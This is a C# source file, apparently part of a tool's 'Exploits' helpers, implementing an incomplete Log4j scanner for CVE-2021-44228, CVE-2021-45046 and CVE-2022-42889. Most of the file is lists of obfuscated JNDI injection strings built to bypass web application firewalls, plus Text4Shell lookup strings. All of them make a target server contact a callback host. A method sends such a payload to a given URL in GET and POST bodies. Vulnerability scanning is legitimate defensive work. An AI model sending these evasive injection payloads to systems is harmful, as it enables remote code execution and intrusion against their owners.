using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace OelianderUI.Helpers.Exploits
{
    public class log4jscanner
    {
        /// <summary>
        /// Log4j Scanner [CVE-2021-44228]
        /// </summary>
        /// 
        /// NOTE*
        /// THIS IS NOT COMPLETE CODE, THIS IS JUST A SNIPPET
        /// DOES NOT CURRENTLY WORK (NEEDS TO BE COMPLETED)

        private static HttpClient client = new HttpClient();
        string[] post_data_parameters = { "username", "user", "uname", "name", "email", "email_address", "password" };
        int timeout = 4;
        internal static string callbackHost = "localhost";
        private static List<string> wafBypassPayloads = new List<string>
        {
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}/",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}/{{random}}}",
                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}",
                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
        };
        private static List<string> cve_2021_45046 = new List<string> {
                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  // Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                 };

        private static List<string> cve_2022_42889 = new List<string> {
                  "${url:UTF-8::https://{{callback_host}}/}",
                  "${url:UTF-8::https://{{callback_host}}/{{random}}}",
                  "${url:UTF-8::http://{{callback_host}}/}",
                  "${url:UTF-8::http://{{callback_host}}/{{random}}}",
                  "${dns:address|{{callback_host}}}"
                 };

        static async Task ScanLog4J(string url, string[] args = null)
        {
            await ScanUrlAsync(url);
        }

        private static async Task ScanUrlAsync(string url)
        {
            string randomString = GenerateRandomString(7);
            string payload = $"${{jndi:ldap://{url}.{callbackHost}/{randomString}}}";

            Console.WriteLine($"[•] Scanning URL: {url} with Payload: {payload}");

            // Send GET request
            await SendHttpRequestAsync(url, payload, HttpMethod.Get);

            // Send POST request (example)
            await SendHttpRequestAsync(url, payload, HttpMethod.Post);
        }

        private static async Task SendHttpRequestAsync(string url, string payload, HttpMethod method)
        {
            try
            {
                var requestMessage = new HttpRequestMessage(method, url)
                {
                    Content = new StringContent($"v={payload}", Encoding.UTF8, "application/x-www-form-urlencoded")
                };

                // Add headers
                requestMessage.Headers.Add("User-Agent", "log4j-scan (https://github.com/mazen160/log4j-scan)");
                requestMessage.Headers.Add("Accept", "*/*");

                HttpResponseMessage response = await client.SendAsync(requestMessage);
                response.EnsureSuccessStatusCode();
                Console.WriteLine($"[•] Response: {response.StatusCode}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[EXCEPTION]: {ex.Message}");
            }
        }

        private static string GenerateRandomString(int length)
        {
            var random = new Random();
            var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[length];
            for (int i = 0; i < length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            return new string(stringChars);
        }   
    }
}
